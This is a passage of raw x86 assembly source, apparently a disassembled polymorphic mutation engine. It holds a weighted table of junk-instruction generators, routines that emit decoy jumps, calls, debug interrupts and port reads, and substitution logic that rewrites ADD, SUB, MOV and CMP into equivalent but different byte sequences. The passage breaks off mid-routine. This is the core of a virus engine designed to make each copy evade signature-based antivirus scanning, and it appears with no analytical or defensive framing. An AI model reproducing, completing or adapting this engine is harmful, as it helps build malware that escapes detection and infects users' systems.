; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@7:
   mov	al, CSPREF_2
   mov	byte ptr CSPREF, al ; use needed prefix	segment	(because instruction will write	to code	space)
   push	cx
   mov	ch, 0
   call	_Allocate_Code_Space
   pop	cx
   add	dx, D_CODEBASE
   mov	edi, 1060000h
   mov	di, dx
   movzx si, ch
   mov	bl, 0		 ; BL =	0 --> from operand ESI to operand EDI
   jmp	short @@6
Do_Garbage endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

; INPUT:
;    CL	= OperandSize
; 
; OUTPUT:
;    CH	= register

Garbage_Choose_Register	proc near
   call	_Choose_Register
   cmp	ch, 8
   jnb	Garbage_Next1
   retn
Garbage_Choose_Register	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

; INPUT:
;    CL	= OperandSize
;    CH	= register
; 
; OUTPUT:
;    AL	= 0

Garbage_Check_Register proc near
   push	ax
   call	_IsRegUsed
   call	setRegFree
   cmp	al, 0
   pop	ax
   jnz	Garbage_Next1
   retn
Garbage_Check_Register endp

; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
TableX dw offset Generate_Garbage_LAHF
   dw 300h
   dw offset Generate_Garbage_XLAT
   dw 300h
   dw offset Generate_Garbage_CMPSB_SCASB_LODSB
   dw 900h
   dw offset Generate_Garbage_2byte
   dw 3000h
   dw offset Generate_Garbage_CWD_CDQ
   dw 300h
   dw offset Generate_Garbage_DEC_INC_NEG_NOT
   dw 3000h
   dw offset Generate_Garbage_BSF_BSR
   dw 6
   dw offset Generate_Garbage_SETcc
   dw 30h
   dw offset Generate_Garbage_LEA
   dw 300h
   dw offset Generate_Garbage_MOVZX_MOVSX
   dw 0Ch
   dw offset Generate_Garbage_TEST
   dw 1200h
   dw offset Generate_Garbage_1byte
   dw 1800h
   dw offset Generate_Garbage_Jcc
   dw 300h
   dw offset Generate_Garbage_Shift
   dw 1200h
   dw offset Generate_Garbage_CALL
   dw 300h
   dw offset Generate_Garbage_MOVSEG
   dw 300h
   dw offset Generate_Garbage_JMP_32bit
   dw 0Ch
   dw offset Generate_Garbage_CALL_32bit
   dw 0Ch
   dw offset Generate_Garbage_PUSHF_PUSH
   dw 0C00h
   dw offset Generate_Garbage_MUL_IMUL
   dw 600h
   dw offset Generate_Garbage_SETALC
   dw 30h
   dw offset Generate_Garbage_XCHG
   dw 1800h
   dw offset Generate_Garbage_INT3
   dw 0
   dw offset Generate_Garbage_INT1
   dw 0
   dw offset Generate_Garbage_IN
   dw 3
   dw offset Generate_Garbage_MoreGarbage
   dw 0C0h
   dw 0FFFFh

; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Garbage_Next1 proc near
   pop	dx

loc_0_163E:
   call	_getRND_in_DX
   movzx edx, dx
   inc	bp
   cmp	bp, 8
   jb	loc_0_1656
   cmp	dh, 20h
   jb	Generate_Garbage_1byte
   jmp	Garbage_Exit2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1656:
   mov	bx, offset TableX-4
   mov	eax, dword_0_26F
   rol	eax, 1

loc_0_1660:
   ror	eax, 1
   add	bx, 4
   cmp	word ptr [bx], 0FFFFh
   jz	loc_0_163E
   sub	dx, [bx+2]
   jnb	loc_0_1660
   call	_getRND_in_DX
   or	dh, dh
   jz	loc_0_167D	 ; generate it one out of 256 times
   test	al, 1
   jz	loc_0_163E	 ; bit cleared

loc_0_167D:
   call	_getRND_in_DX
   movzx edx, dx	 ; EDX = 0000..FFFF
   jmp	word ptr [bx]
Garbage_Next1 endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_LAHF proc near
   mov	cx, 401h	 ; register AH
   mov	al, 9Fh		 ; LAHF

loc_0_168C:
   call	_Garbage_Check_Register

loc_0_1690:
   call	_Store_Instruction_Byte

loc_0_1694:
   call	_Copy_Instruction

loc_0_1698:
   jmp	Garbage_Exit2
Generate_Garbage_LAHF endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_XLAT proc near
   mov	cx, 1		 ; register AL
   mov	al, 0D7h	 ; XLAT
   jmp	short loc_0_168C
Generate_Garbage_XLAT endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_CMPSB_SCASB_LODSB proc	near
   mov	cx, 602h	 ; register SI
   call	_Garbage_Check_Register
   mov	cx, 702h	 ; register DI
   call	_Garbage_Check_Register
   mov	al, 0A6h	 ; CMPSB
   cmp	dl, 55h
   jb	loc_0_1690
   mov	al, 0AEh	 ; SCASB
   cmp	dl, 0AAh
   jb	loc_0_1690
   mov	al, 0ACh	 ; LODSB
   mov	cx, 1		 ; register AL
   jmp	short loc_0_168C
Generate_Garbage_CMPSB_SCASB_LODSB endp

; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
Table_Garbage_2byte dw 37h ; AAA
   dw 0AD4h		 ; AAM
   dw 0AD5h		 ; AAD
   dw 3Fh		 ; AAS
   dw 27h		 ; DAA
   dw 2Fh		 ; DAS
   dw 98h		 ; CBW
   dw 9866h		 ; CWDE
   dw 0AA8h		 ; TEST	AL,0A
   dw 40h		 ; INC AX
   dw 48h		 ; DEC AX
   dw 0AB0h		 ; MOV AL,0A
   dw 0AB4h		 ; MOV AH,0A

; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_2byte proc near
   mov	cx, 4		 ; register EAX
   call	_Garbage_Check_Register
   imul	edx, 1Ah
   shr	edx, 10h
   mov	di, dx
   and	di, 1Eh
   mov	ax, Table_Garbage_2byte[di]
   call	_Store_Instruction_Byte
   xchg	al, ah
   cmp	al, 0
   jz	loc_0_1694	 ; jump	if just	one byte
   cmp	al, 0Ah
   jnz	loc_0_1690	 ; doesnt need immediate
   call	_getRND_in_DX
   mov	al, dl
   cmp	ah, 0D4h	 ; AAM
   jnz	loc_0_1690
   cmp	al, 1		 ; avoid zero divide
   adc	al, 0

loc_0_1714:
   jmp	loc_0_1690
Generate_Garbage_2byte endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_CWD_CDQ proc near
   mov	cx, 204h	 ; register EDX
   call	_Garbage_Check_Register
   mov	al, 99h		 ; CWD
   cmp	dl, 0C0h
   jb	loc_0_1714
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 66h		 ; CDQ
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   jmp	short loc_0_1714
Generate_Garbage_CWD_CDQ endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_DEC_INC_NEG_NOT proc near
   call	_getRND_OperandSize
   cmp	dh, 80h
   jb	loc_0_1737
   mov	cl, 2		 ; use word instead

loc_0_1737:
   call	_Garbage_Choose_Register
   movzx edi, ch	 ; EDI = target
   cmp	dl, 60h
   jnb	loc_0_174A
   call	Do_DEC
   jmp	loc_0_1698
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_174A:
   cmp	dl, 0C0h
   jnb	loc_0_1755
   call	Do_INC
   jmp	loc_0_1698
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1755:
   cmp	dl, 0E0h
   jnb	loc_0_1760
   call	Do_NEG
   jmp	loc_0_1698
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1760:
   call	Do_NOT

loc_0_1763:
   jmp	Garbage_Exit2
Generate_Garbage_DEC_INC_NEG_NOT endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_BSF_BSR proc near
   mov	cl, 4
   call	_Garbage_Choose_Register ; choose DWORD	register
   movzx esi, ch	 ; ESI = source
   call	_getRND_Target	 ; EDI = target
   cmp	dl, 80h
   jnb	loc_0_177E
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 66h
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_177E:
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 0Fh
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   mov	al, 0BCh
   and	dl, 1
   add	al, dl		 ; BSF/BSR

loc_0_178A:
   call	_Store_Instruction_Byte
   call	_Generate_ModRM
   jmp	loc_0_1694
Generate_Garbage_BSF_BSR endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_SETcc proc near
   mov	cl, 1
   call	_Garbage_Choose_Register
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 0Fh
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   mov	al, 90h		 ; SETcc
   and	dl, 0Fh
   add	al, dl
   call	_Store_Instruction_Byte
   mov	al, ch
   or	al, 0C0h
   jmp	loc_0_1714
Generate_Garbage_SETcc endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_LEA proc near
   mov	cl, 4
   call	_Garbage_Choose_Register
   movzx si, ch
   mov	cl, 1
   call	_getRND_Target	 ; random displacement with index
   test	edi, 0FFFF0000h
   jnz	loc_0_17DF	 ; jump	if not register
   call	_getRND_in_DX
   and	dx, 7
   or	dh, 1
   shl	edx, 10h
   call	_getRND_in_DX	 ; random memory displacement
   mov	edi, edx

loc_0_17DF:		 ; LEA
   mov	al, 8Dh

loc_0_17E1:
   jmp	short loc_0_178A
Generate_Garbage_LEA endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_MOVZX_MOVSX proc near
   mov	cl, 2
   call	_Garbage_Choose_Register
   movzx si, ch
   mov	cl, 1		 ; CL =	size of	source
   cmp	dl, 37h
   jb	loc_0_17FF
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 66h
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   mov	cl, dl
   and	cl, 1
   inc	cl		 ; CL =	size of	source

loc_0_17FF:
   call	_getRND_Target
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 0Fh
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   mov	al, 0B6h	 ; MOVZX
   and	dh, 1
   jz	loc_0_1811
   mov	al, 0BEh	 ; MOVSX

loc_0_1811:		 ; add one according to	its size
   call	_Size_8_16
   jmp	short loc_0_17E1
Generate_Garbage_MOVZX_MOVSX endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_TEST proc near
   call	_getRND_OperandSize
   call	_Add_Needed_Prefix_66
   cmp	dl, 55h
   jnb	loc_0_1835
   call	_getRND_Target
   mov	si, dx
   and	si, 7
   mov	al, 84h		 ; TEST	reg, reg/mem
   call	_Size_8_16	 ; add one according to	its size
   jmp	short loc_0_17E1
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1835:
   cmp	dl, 0AAh
   jnb	loc_0_185F
   call	_getRND_Target
   xor	si, si
   mov	al, 0F6h	 ; TEST	reg/mem, imm
   call	_Size_8_16	 ; add one according to	its size
   call	_Store_Instruction_Byte
   call	_Generate_ModRM

loc_0_184E:
   mov	ch, 0

loc_0_1850:
   call	_getRND_in_DX
   mov	al, dl
   call	_Store_Instruction_Byte	; store	immediate
   loop	loc_0_1850
   jmp	loc_0_1694
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_185F:		 ; TEST	EAX, imm
   mov	al, 0A8h
   call	_Size_8_16	 ; add one according to	its size
   call	_Store_Instruction_Byte
   jmp	short loc_0_184E
Generate_Garbage_TEST endp

; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
Table_Garbage_1byte db 0F8h ; CLC
   db 0F5h		 ; CMC
   db 0F9h		 ; STC
   db 90h		 ; NOP
   db 9Bh		 ; WAIT
   db 9Eh		 ; SAHF

; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_1byte proc near
   imul	edx, 6
   shr	edx, 10h	 ; EDX=0..5
   mov	bx, dx
   mov	al, Table_Garbage_1byte[bx]
   jmp	loc_0_1690
Generate_Garbage_1byte endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_Jcc proc near
   mov	al, 0EBh	 ; JMP
   cmp	dl, 20h
   jb	loc_0_18A7
   and	dh, 0Fh
   mov	al, 70h		 ; Jcc
   add	al, dh
   cmp	dl, 40h
   ja	loc_0_18A7
   mov	al, 0E0h	 ; LOOPNZ/LOOZ/LOOP/JCXZ
   and	dh, 3
   add	al, dh
   cmp	al, 0E3h
   jz	loc_0_18A7
   mov	cx, 102h	 ; register CX
   call	_Garbage_Check_Register	; (make	sure we	can modify it)

loc_0_18A7:
   call	_Store_Instruction_Byte
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 0
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   call	_Copy_Instruction
   mov	di, Instruction_Offset
   call	_getRND_in_DX
   and	dx, 3
   mov	cx, dx
   call	_getRND_in_DX
   and	dx, 3
   add	cx, dx
   inc	cx		 ; CX =	1..7

loc_0_18CB:
   call	_Generate_4times_Garbage
   mov	ax, Instruction_Offset
   sub	ax, di
   cmp	ax, 7Fh
   ja	loc_0_18DF	 ; too far... leave previously fixed jump
   mov	es:[di-1], al	 ; fix jump
   loop	loc_0_18CB

loc_0_18DF:		 ; add some more garbage (after	target of jump)
   call	Do_Garbage

loc_0_18E2:
   jmp	loc_0_1763
Generate_Garbage_Jcc endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_Shift proc near
   call	_getRND_OperandSize
   call	_Garbage_Choose_Register
   movzx edi, ch	 ; EDI = target
   call	_getRND_in_DX
   mov	bx, dx
   and	bh, 7		 ; operation
   test	dl, 80h
   jnb	loc_0_1904	 ; use CL register for shift operation
   call	Do_SHIFT
   jmp	short loc_0_18E2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1904:
   call	Do_SHIFT_CL
   jmp	short loc_0_18E2
Generate_Garbage_Shift endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_CALL proc near
   cmp	Return_Offset, 0FFFFh
   jnz	loc_0_18E2
   call	Do_CALL2	 ; generate CALL
   call	_getRND_in_DX
   and	dx, 3
   mov	cx, dx
   call	_getRND_in_DX
   and	dx, 3
   add	cx, dx
   inc	cx		 ; CX =	1..7

loc_0_1927:		 ; fill	it with	garbage
   call	_Generate_4times_Garbage
   loop	loc_0_1927
   call	Check_CALL	 ; restore execution point
   jmp	short loc_0_18E2
Generate_Garbage_CALL endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_MOVSEG	proc near
   mov	cl, 2
   call	_Garbage_Choose_Register
   movzx edi, ch
   and	dx, 7
   mov	si, dx		 ; select segment register
   cmp	dl, 6
   jb	loc_0_194F
   call	_getRND_in_DX
   and	dx, 3
   mov	si, dx

loc_0_194F:
   call	Do_MOV_mem_seg

loc_0_1952:
   jmp	short loc_0_18E2
Generate_Garbage_MOVSEG	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_JMP_32bit proc	near
   push	offset Garbage_Exit2
   mov	al, 0E9h	 ; JMP
Generate_Garbage_JMP_32bit endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_JMP_CALL_32bit	proc near
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 66h
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   call	_Store_Instruction_Byte
   call	_Store_Instruction_Byte
   call	_Store_Instruction_Byte
   call	_Store_Instruction_Byte
   call	_Store_Instruction_Byte
   call	_Copy_Instruction
   mov	cx, 4
   call	_Allocate_Code_Space
   xchg	ax, dx
   mov	si, ax
   xchg	si, Instruction_Offset
   sub	ax, si
   cwde
   mov	es:[si-4], eax	 ; fix jump
   retn
Generate_Garbage_JMP_CALL_32bit	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_CALL_32bit proc near
   mov	al, 0E8h	 ; CALL
   call	Generate_Garbage_JMP_CALL_32bit
   mov	cl, 4

loc_0_1995:		 ; restore stack
   call	Add_Stack

loc_0_1998:
   jmp	short loc_0_1952
Generate_Garbage_CALL_32bit endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_PUSHF_PUSH proc near
   mov	cl, 2
   cmp	dl, 10h
   jnb	loc_0_19A3
   mov	cl, 4

loc_0_19A3:
   mov	di, dx
   and	edi, 3
   cmp	dh, 10h
   jnb	loc_0_19B2
   call	_getRND_Target

loc_0_19B2:
   test	dh, 0Fh
   jnz	loc_0_19C6
   call	_Add_Needed_Prefix_66
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 9Ch		 ; PUSHF
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   call	_Copy_Instruction
   jmp	short loc_0_1995
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_19C6:
   call	Do_PUSH
   jmp	short loc_0_1995
Generate_Garbage_PUSHF_PUSH endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_MUL_IMUL proc near
   mov	cx, 4		 ; register EAX
   call	_Garbage_Check_Register
   call	_getRND_OperandSize
   cmp	cl, 1
   jz	loc_0_19E1
   mov	ch, 2		 ; register DX/EDX
   call	_Garbage_Check_Register

loc_0_19E1:
   call	_getRND_Target
   mov	si, dx
   and	si, 1
   or	si, 4		 ; MUL/IMUL
   call	_Add_Needed_Prefix_66
   mov	al, 0F6h
   call	_Size_8_16	 ; add one according to	its size
   jmp	loc_0_178A
Generate_Garbage_MUL_IMUL endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_SETALC	proc near
   mov	cx, 4		 ; register EAX
   mov	al, 0D6h	 ; SETALC
   jmp	loc_0_168C
Generate_Garbage_SETALC	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_XCHG proc near
   mov	cx, 2		 ; register AX
   call	_Garbage_Check_Register
   call	_Garbage_Choose_Register
   or	ch, ch
   jz	loc_0_163E
   mov	al, ch
   add	al, 90h		 ; XCHG	AX,reg16

loc_0_1A17:
   jmp	loc_0_1690
Generate_Garbage_XCHG endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_INT3 proc near
   mov	al, 0CCh
   jmp	short loc_0_1A17
Generate_Garbage_INT3 endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_INT1 proc near
   mov	al, 0F1h
   jmp	short loc_0_1A17
Generate_Garbage_INT1 endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_IN proc near
   call	_getRND_OperandSize
   mov	ch, 0		 ; register AL/AX/EAX
   call	_Garbage_Check_Register
   mov	al, 0E4h
   call	_Size_8_16	 ; add one according to	its size
   call	_Store_Instruction_Byte
   mov	al, dl		 ; random port
   jmp	short loc_0_1A17
Generate_Garbage_IN endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Generate_Garbage_MoreGarbage proc near
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   jmp	loc_0_1998
Generate_Garbage_MoreGarbage endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_MOV proc near
   push	bx
   push	cx
   push	dx
   push	esi		 ; ESI = source
   push	edi		 ; EDI = target
   call	_getRND_in_DX
   cmp	dh, 20h
   jb	loc_0_1A7E
   cmp	dh, 40h
   jnb	loc_0_1A70
   cmp	Dont_Use_Exchange_For_MOV_operation, 0
   jnz	loc_0_1A70
   call	_Do_XCHG2	 ; exchange operands
   jmp	loc_0_1AFE
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1A70:
   cmp	esi, 8
   jb	loc_0_1ADF
   cmp	edi, 8
   mov	bl, 2
   jb	loc_0_1AF0

loc_0_1A7E:
   cmp	cl, 1
   jz	loc_0_1A91	 ; jump	if OperandSize=1
   xchg	edi, esi
   call	Do_PUSH		 ; PUSH	source
   mov	edi, esi
   call	Do_POP		 ; POP target
   jmp	short loc_0_1AFE
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1A91:		 ; CH =	auxiliar register
   call	getRND_Reg
   cmp	edi, 8
   jnb	loc_0_1AAA
   mov	dx, di		 ; DX =	target operand
   xor	dl, ch
   and	dl, 3
   xor	dl, ch
   cmp	dl, ch
   jnz	loc_0_1AAA	 ; jump	if both	byte registers are owned by different word registers
   xor	ch, 7		 ; select another one

loc_0_1AAA:		 ; EDI = target
   push	edi
   movzx edi, ch
   and	di, 3		 ; EDI = auxiliar register
   mov	cl, 2		 ; word
   call	Do_PUSH		 ; PUSH	auxiliar
   mov	edi, esi	 ; EDI = source
   movzx esi, ch	 ; ESI = auxiliar (target operand)
   mov	cl, 1
   mov	bl, 2
   mov	bh, 0FFh	 ; operation = MOV
   call	_Do_Instruction2
   pop	edi		 ; EDI = target
   mov	bl, 0		 ; ESI = auxiliar (source operand)
   call	_Do_Instruction2
   movzx edi, ch
   and	di, 3
   mov	cl, 2
   call	Do_POP		 ; POP auxiliar
   jmp	short loc_0_1AFE
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_1ADF:
   mov	bl, 0
   cmp	edi, 8
   jnb	loc_0_1AF0
   call	_getRND_in_DX	 ; (if both are	registers, choose direction)
   mov	bl, dh
   and	bl, 2		 ; choose direction of move

loc_0_1AF0:
   cmp	bl, 2
   jnz	loc_0_1AF8
   xchg	edi, esi	 ; BL=2	means ESI would	be target operand
			 ; thats why they are exchanged	so ESI will remain source

loc_0_1AF8:		 ; operation = MOV
   mov	bh, 0FFh
   call	_Do_Instruction2

loc_0_1AFE:
   pop	edi
   pop	esi
   pop	dx
   pop	cx
   pop	bx
   retn
Do_MOV endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_Instruction3	proc near
   cmp	SaveFlags, 0FFh
   jz	Do_Instruction2	 ; jump	if segment prefix has already been stored
   cmp	bl, 4
   jb	Do_Instruction2	 ; jump	if not immediate
   push	dx
   call	_getRND_in_DX
   pop	dx
   jns	Do_Instruction2
   cmp	bh, 7		 ; (CMP)
   jz	@@2
   cmp	SaveFlags, 0
   jnz	Do_Instruction2	 ; dont	touch cpu flags
   push	dx
   call	_getRND_in_DX
   cmp	dh, 60h
   pop	dx
   jb	@@9
   cmp	bh, 0FFh
   jz	@@4
   cmp	bh, 5		 ; (SUB)
   jz	@@1
   cmp	bh, 0		 ; (ADD)
   jnz	Do_Instruction2
   mov	bh, 5		 ; ADD-->SUB
   neg	esi
   call	_Do_Instruction2
   neg	esi		 ; restore info	about original instruction
   mov	bh, 0
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@1:			 ; SUB-->ADD
   mov	bh, 0
   neg	esi
   call	_Do_Instruction2
   neg	esi		 ; restore info	about original instruction
   mov	bh, 5
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@2:
   or	esi, esi
   jnz	Do_Instruction2
   test	edi, 0FFFF0000h
   jnz	Do_Instruction2	 ; skip	if not CMP reg,0
   mov	esi, edi
   mov	bl, 2
   mov	bh, 1		 ; OR reg,reg
   push	dx
   call	_getRND_in_DX
   pop	dx
   jns	@@3
   mov	bh, 4		 ; AND reg,reg

@@3:
   call	_Do_Instruction2
   xor	esi, esi	 ; restore info	about original instruction
   mov	bl, 4
   mov	bh, 7
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@4:
   or	esi, esi
   jnz	@@7		 ; jump	if not MOV reg/mem,0
   test	edi, 0FFFF0000h
   jnz	@@6		 ; jump	if not MOV reg,0
   push	dx
   call	_getRND_in_DX
   cmp	dh, 40h
   pop	dx
   jb	@@6
   mov	esi, edi
   mov	bl, 2
   mov	bh, 6		 ; XOR reg,reg
   push	dx
   call	_getRND_in_DX
   pop	dx
   jns	@@5
   mov	bh, 5		 ; SUB reg,reg

@@5:
   call	_Do_Instruction2
   xor	esi, esi	 ; restore info	about original instruction
   mov	bl, 4
   mov	bh, 0FFh
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@6:			 ; AND reg/mem,0
   mov	bh, 4
   call	_Do_Instruction5
   mov	bh, 0FFh	 ; restore info	about original instruction
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@7:
   cmp	esi, 0FFFFFFFFh
   jnz	Do_Instruction2	 ; skip	if not MOV reg,-1
   mov	bh, 1		 ; OR reg,-1
   call	_Do_Instruction5
   mov	bh, 0FFh	 ; restore info	about original instruction
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@8:
   popad
   nop
   jmp	Do_Instruction2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@9:
   pushad
